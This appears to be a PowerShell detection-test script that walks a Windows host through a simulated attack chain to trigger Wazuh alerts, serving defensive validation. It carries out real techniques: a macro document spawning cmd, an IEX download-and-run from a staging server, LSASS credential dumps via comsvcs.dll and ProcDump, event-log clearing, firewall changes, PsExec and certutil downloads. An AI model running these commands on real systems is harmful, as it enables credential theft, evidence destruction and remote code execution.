<#
.SYNOPSIS
    Operation Feeding_Time — Complete Kill Chain Test Script
.DESCRIPTION
    Triggers all 9 Wazuh custom rules in sequence:
    100006 (Initial Access), 100005 (Execution), 100014 (Persistence),
    100010 (Defense Evasion), 100011 (Defense Evasion), 100400 (Credential Access),
    100015 (Credential Access), 100016 (Lateral Movement), 100502 (Lateral Movement),
    100105 (C2/Download)
.NOTES
    Requires: Windows Server 2022, Sysmon (Event IDs 1,3,10,17,18), Wazuh Agent
    Staging Server: 192.168.30.12:8080
    Run as Administrator
#>

param([switch]$Cleanup)

$StagingServer = "http://192.168.30.12:8080"
$ToolsDir = "C:\Tools"
$TempDir = "C:\Temp"
$MacroDoc = "$TempDir\Feeding_Time_Invoice.docm"

# Ensure directories exist
New-Item -ItemType Directory -Path $ToolsDir -Force | Out-Null
New-Item -ItemType Directory -Path $TempDir -Force | Out-Null

# --- DOWNLOAD TOOLS ---
function Get-SysinternalsTool {
    param($ToolName)
    $Path = "$ToolsDir\$ToolName.exe"
    if (-not (Test-Path $Path)) {
        Write-Host "    [+] Downloading $ToolName..." -ForegroundColor Cyan
        try {
            Invoke-WebRequest -Uri "https://live.sysinternals.com/$ToolName.exe" -OutFile $Path -UseBasicParsing -TimeoutSec 30
            Write-Host "    [OK] $ToolName downloaded." -ForegroundColor Green
        } catch {
            Write-Host "    [!] Failed to download $ToolName. Error: $_" -ForegroundColor Red
            return $null
        }
    } else {
        Write-Host "    [OK] $ToolName already exists." -ForegroundColor Green
    }
    return $Path
}

# --- CREATE MALICIOUS MACRO DOCUMENT ---
function New-MacroDocument {
    param($OutputPath)
    if (Test-Path $OutputPath) {
        Write-Host "    [OK] Macro document already exists." -ForegroundColor Green
        return $OutputPath
    }

    Write-Host "    [+] Creating malicious macro document..." -ForegroundColor Cyan

    # VBA macro that spawns cmd.exe (triggers 100006)
    $vbaCode = @"
Sub AutoOpen()
    Shell "cmd.exe /c echo Feeding_Time-InitialAccess > C:\Temp\macro_trigger.txt", vbHide
End Sub
"@

    try {
        # Create Word application COM object
        $word = New-Object -ComObject Word.Application
        $word.Visible = $false

        # Create new document
        $doc = $word.Documents.Add()

        # Add VBA module
        $module = $doc.VBProject.VBComponents.Add(1) # 1 = vbext_ct_StdModule
        $module.CodeModule.AddFromString($vbaCode)

        # Save as .docm (macro-enabled)
        $doc.SaveAs2($OutputPath, 13) # 13 = wdFormatXMLDocumentMacroEnabled
        $doc.Close()
        $word.Quit()

        [System.Runtime.Interopservices.Marshal]::ReleaseComObject($word) | Out-Null

        Write-Host "    [OK] Macro document created at $OutputPath" -ForegroundColor Green
        return $OutputPath
    } catch {
        Write-Host "    [!] Failed to create macro document. Error: $_" -ForegroundColor Red
        Write-Host "    [!] Falling back to direct cmd.exe spawn (won't trigger 100006)." -ForegroundColor Yellow
        return $null
    }
}

# --- TRIGGER INITIAL ACCESS (100006) ---
function Invoke-InitialAccess {
    Write-Host "`n[1/10] Phase: Initial Access (Rule 100006)" -ForegroundColor Yellow
    Write-Host "       Office application spawning cmd.exe"

    $docPath = New-MacroDocument -OutputPath $MacroDoc

    if ($docPath -and (Test-Path $docPath)) {
        try {
            # Open the document to trigger AutoOpen macro
            $word = New-Object -ComObject Word.Application
            $word.Visible = $false
            $doc = $word.Documents.Open($docPath)

            # Run the macro
            $word.Run("AutoOpen")

            Start-Sleep -Seconds 2
            $doc.Close($false)
            $word.Quit()
            [System.Runtime.Interopservices.Marshal]::ReleaseComObject($word) | Out-Null

            Write-Host "       [OK] Macro executed — cmd.exe spawned from winword.exe" -ForegroundColor Green
        } catch {
            Write-Host "       [!] Macro execution failed: $_" -ForegroundColor Red
        }
    } else {
        Write-Host "       [!] Skipping macro — document not available." -ForegroundColor Yellow
    }

    Start-Sleep -Seconds 15
}

# --- TRIGGER EXECUTION (100005) ---
function Invoke-Execution {
    Write-Host "`n[2/10] Phase: Execution (Rule 100005)" -ForegroundColor Yellow
    Write-Host "       PowerShell with encoded command / download"

    # Trigger 100005: PowerShell with suspicious parameters
    $psCmd = "powershell.exe -Command `"IEX (New-Object Net.WebClient).DownloadString('$StagingServer/payload.ps1')`""
    Write-Host "       [+] Executing: $psCmd" -ForegroundColor Cyan

    # Execute in background
    Start-Process -FilePath "powershell.exe" -ArgumentList "-Command", "IEX (New-Object Net.WebClient).DownloadString('$StagingServer/payload.ps1')" -WindowStyle Hidden

    Write-Host "       [OK] PowerShell IEX download triggered." -ForegroundColor Green
    Start-Sleep -Seconds 15
}

# --- TRIGGER PERSISTENCE (100014) ---
function Invoke-Persistence {
    Write-Host "`n[3/10] Phase: Persistence (Rule 100014)" -ForegroundColor Yellow
    Write-Host "       Scheduled task creation"

    schtasks /create /tn "Feeding_Time-Persist" /tr "calc.exe" /sc once /st "23:59" /f | Out-Null
    Write-Host "       [OK] Scheduled task created." -ForegroundColor Green
    Start-Sleep -Seconds 15
}

# --- TRIGGER DEFENSE EVASION (100010) ---
function Invoke-DefenseEvasion-Netsh {
    Write-Host "`n[4/10] Phase: Defense Evasion (Rule 100010)" -ForegroundColor Yellow
    Write-Host "       Netsh firewall modification"

    netsh advfirewall firewall add rule name="Feeding_Time-Evasion" dir=in action=allow protocol=TCP localport=7777 | Out-Null
    Write-Host "       [OK] Firewall rule added." -ForegroundColor Green
    Start-Sleep -Seconds 15
}

# --- TRIGGER DEFENSE EVASION (100011) ---
function Invoke-DefenseEvasion-Wevtutil {
    Write-Host "`n[5/10] Phase: Defense Evasion (Rule 100011)" -ForegroundColor Yellow
    Write-Host "       Event log clearing"

    wevtutil cl System
    Write-Host "       [OK] System event log cleared." -ForegroundColor Green
    Start-Sleep -Seconds 15
}

# --- TRIGGER CREDENTIAL ACCESS (100400) ---
function Invoke-CredentialAccess-LSASS {
    Write-Host "`n[6/10] Phase: Credential Access (Rule 100400)" -ForegroundColor Yellow
    Write-Host "       LSASS memory dump via comsvcs.dll (built-in Windows)"

    # Use rundll32 + comsvcs.dll to dump LSASS — triggers Sysmon Event 10 with grantedAccess
    $dumpPath = "$TempDir\lsass.dmp"
    $cmd = "rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump (Get-Process lsass).Id $dumpPath full"

    Write-Host "       [+] Executing: $cmd" -ForegroundColor Cyan

    # This requires admin privileges
    try {
        $lsassPid = (Get-Process lsass).Id
        Start-Process -FilePath "rundll32.exe" -ArgumentList "C:\Windows\System32\comsvcs.dll, MiniDump $lsassPid $dumpPath full" -WindowStyle Hidden -Wait
        Write-Host "       [OK] LSASS dump attempted via comsvcs.dll." -ForegroundColor Green
    } catch {
        Write-Host "       [!] LSASS dump failed: $_" -ForegroundColor Red
    }

    Start-Sleep -Seconds 15
}

# --- TRIGGER CREDENTIAL ACCESS (100015) ---
function Invoke-CredentialAccess-Tools {
    Write-Host "`n[7/10] Phase: Credential Access (Rule 100015)" -ForegroundColor Yellow
    Write-Host "       Credential dumping tool execution"

    $procdump = Get-SysinternalsTool -ToolName "procdump"

    if ($procdump) {
        $dumpPath = "$TempDir\lsass_procdump.dmp"
        Start-Process -FilePath $procdump -ArgumentList "-accepteula -ma lsass.exe", $dumpPath -WindowStyle Hidden -Wait
        Write-Host "       [OK] ProcDump executed against LSASS." -ForegroundColor Green
    } else {
        Write-Host "       [!] ProcDump not available. Rule 100015 may not fire." -ForegroundColor Yellow
    }

    Start-Sleep -Seconds 15
}

# --- TRIGGER LATERAL MOVEMENT (100016) ---
function Invoke-LateralMovement-Exec {
    Write-Host "`n[8/10] Phase: Lateral Movement (Rule 100016)" -ForegroundColor Yellow
    Write-Host "       PsExec execution"

    $psexec = Get-SysinternalsTool -ToolName "psexec"

    if ($psexec) {
        # PsExec against localhost to trigger Sysmon Event 1
        Start-Process -FilePath $psexec -ArgumentList "\localhost -accepteula cmd /c echo Feeding_Time-Lateral" -WindowStyle Hidden -Wait
        Write-Host "       [OK] PsExec executed against localhost." -ForegroundColor Green
    } else {
        Write-Host "       [!] PsExec not available. Rule 100016 may not fire." -ForegroundColor Yellow
    }

    Start-Sleep -Seconds 15
}

# --- TRIGGER LATERAL MOVEMENT (100502) ---
function Invoke-LateralMovement-Pipes {
    Write-Host "`n[9/10] Phase: Lateral Movement (Rule 100502)" -ForegroundColor Yellow
    Write-Host "       PsExec pipe detection"

    # PsExec pipe detection happens automatically when PsExec runs (Rule 100016 above)
    # The pipe \PSEXESVC is created by PsExec service
    # If PsExec was downloaded and ran above, this should already be covered
    # But let's also try to trigger it explicitly

    $psexec = "$ToolsDir\psexec.exe"
    if (Test-Path $psexec) {
        # Run PsExec again to ensure pipe events are generated
        Start-Process -FilePath $psexec -ArgumentList "\localhost -accepteula -s cmd /c echo PipeTest" -WindowStyle Hidden
        Write-Host "       [OK] PsExec service pipe should be created." -ForegroundColor Green
    } else {
        Write-Host "       [!] PsExec not available. Rule 100502 may not fire." -ForegroundColor Yellow
    }

    Start-Sleep -Seconds 15
}

# --- TRIGGER C2 / DOWNLOAD (100105) ---
function Invoke-CommandControl {
    Write-Host "`n[10/10] Phase: Command & Control (Rule 100105)" -ForegroundColor Yellow
    Write-Host "       LOLBAS tool making network connection"

    # Trigger 100105: certutil downloading from staging server (Sysmon Event 3)
    $urls = @(
        "$StagingServer/payload.ps1",
        "$StagingServer/stage.ps1",
        "$StagingServer/exfil.txt"
    )

    foreach ($url in $urls) {
        Write-Host "       [+] certutil downloading: $url" -ForegroundColor Cyan
        certutil -urlcache -split -f $url "$TempDir\$(Split-Path $url -Leaf)" | Out-Null
    }

    Write-Host "       [OK] CertUtil downloads completed." -ForegroundColor Green
    Start-Sleep -Seconds 15
}

# --- CLEANUP ---
function Invoke-Cleanup {
    Write-Host "`n[+] Cleaning up test artifacts..." -ForegroundColor Green

    # Remove scheduled task
    schtasks /delete /tn "Feeding_Time-Persist" /f 2>$null | Out-Null
    Write-Host "    [-] Scheduled task removed." -ForegroundColor Cyan

    # Remove firewall rule
    netsh advfirewall firewall delete rule name="Feeding_Time-Evasion" 2>$null | Out-Null
    Write-Host "    [-] Firewall rule removed." -ForegroundColor Cyan

    # Remove temp files
    Remove-Item "$TempDir\*.dmp", "$TempDir\*.txt", "$TempDir\*.ps1" -ErrorAction SilentlyContinue
    Write-Host "    [-] Temp files removed." -ForegroundColor Cyan

    # Remove macro document
    Remove-Item $MacroDoc -ErrorAction SilentlyContinue
    Write-Host "    [-] Macro document removed." -ForegroundColor Cyan

    Write-Host "[+] Cleanup complete.`n" -ForegroundColor Green
}

# ==================== MAIN ====================

if ($Cleanup) {
    Invoke-Cleanup
    exit
}

Write-Host @"
`n========================================
  Operation Feeding_Time
  Wazuh Kill Chain Test Script
========================================
  Staging Server: $StagingServer
  Tools Directory: $ToolsDir
  Temp Directory: $TempDir
  Ensure Wazuh agent is ACTIVE before proceeding.
========================================
"@ -ForegroundColor Cyan

# Verify admin privileges
if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    Write-Host "[!] ERROR: This script must be run as Administrator." -ForegroundColor Red
    Write-Host "    Required for: LSASS dump, firewall rules, scheduled tasks." -ForegroundColor Yellow
    exit 1
}

# Verify Wazuh agent is running
$wazuhService = Get-Service -Name "WazuhSvc" -ErrorAction SilentlyContinue
if (-not $wazuhService -or $wazuhService.Status -ne "Running") {
    Write-Host "[!] WARNING: Wazuh service not detected or not running." -ForegroundColor Red
    Write-Host "    Alerts may not be generated." -ForegroundColor Yellow
} else {
    Write-Host "[OK] Wazuh agent is running." -ForegroundColor Green
}

# Verify Sysmon is running
$sysmonService = Get-Service -Name "Sysmon64" -ErrorAction SilentlyContinue
if (-not $sysmonService -or $sysmonService.Status -ne "Running") {
    Write-Host "[!] WARNING: Sysmon64 service not detected or not running." -ForegroundColor Red
    Write-Host "    Rules 100400 and 100502 require Sysmon Event 10/17/18." -ForegroundColor Yellow
} else {
    Write-Host "[OK] Sysmon64 is running." -ForegroundColor Green
}

Write-Host ""
Read-Host "Press ENTER to begin kill chain execution..."

# Execute kill chain
Invoke-InitialAccess
Invoke-Execution
Invoke-Persistence
Invoke-DefenseEvasion-Netsh
Invoke-DefenseEvasion-Wevtutil
Invoke-CredentialAccess-LSASS
Invoke-CredentialAccess-Tools
Invoke-LateralMovement-Exec
Invoke-LateralMovement-Pipes
Invoke-CommandControl

Write-Host @"
`n========================================
  [+] All phases triggered.
  [+] Check Wazuh alerts:
      sudo grep -a 'Feeding_Time\|10000[0-9]' /var/ossec/logs/alerts/alerts.log
  [+] Check Splunk dashboard:
      Operation Feeding_Time
  [+] Run with -Cleanup to remove artifacts.
========================================
"@ -ForegroundColor Green
